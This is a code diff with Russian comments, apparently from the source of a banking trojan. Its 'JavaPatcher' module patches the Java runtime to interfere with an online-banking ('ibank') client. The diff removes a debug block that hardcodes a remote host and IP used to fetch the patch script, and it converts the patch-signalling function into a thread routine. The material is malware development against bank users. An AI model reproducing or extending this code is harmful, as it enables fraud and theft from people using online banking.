@@ -145,28 +145,6 @@ const char* GetJREPath()
 
 static char* GetJavaPatcherURL( char* url )
 {
-	// Функция возвращает адрес скрипта
-
-	/*
-
-	Не удалил код чтоб обратить на него внимание.
-	дебаговый хост прописан в модуле JavaConfig.h
-	Это важно потому, что в ибанке проверяется к
-	какому хосту идёт подключение, соответственно если
-	прописать хост здесь то ибанк не корректно
-	отрабатывает в отладочной версии
-
-	Игорь, как прочитаешь этот коммент, удали код.
-
-
-
-	#ifdef DEBUGCONFIG
-		m_lstrcpy( url, "http://bifitibsystem.org/" );//"http://94.240.148.127/");//);//rt_jar/");
-		return url;
-	#endif
-	*/
-
-
 	PCHAR URL = NULL;
 	do
 	{
@@ -1164,10 +1142,10 @@ void JavaPatcherAddPidToFile()
 }
 
 // Функция сигнализирует о необходимости запуска патчей
-void  JavaPatcherSignal()
+DWORD WINAPI JavaPatcherSignal(LPVOID lpData)
 {
 
-	if( PatchIsLoaded() ) return; //если патч установлен, то не нужно его повторно ставить
+	if( PatchIsLoaded() ) return 0; //если патч установлен, то не нужно его повторно ставить
 
 	InitData();
 	GetJavaVersion();
@@ -1180,6 +1158,7 @@ void  JavaPatcherSignal()
 	{
 		File::WriteBufferA(SignalFile, (LPVOID)"1", 1);
 	}
+	return 0;
 }
 
 
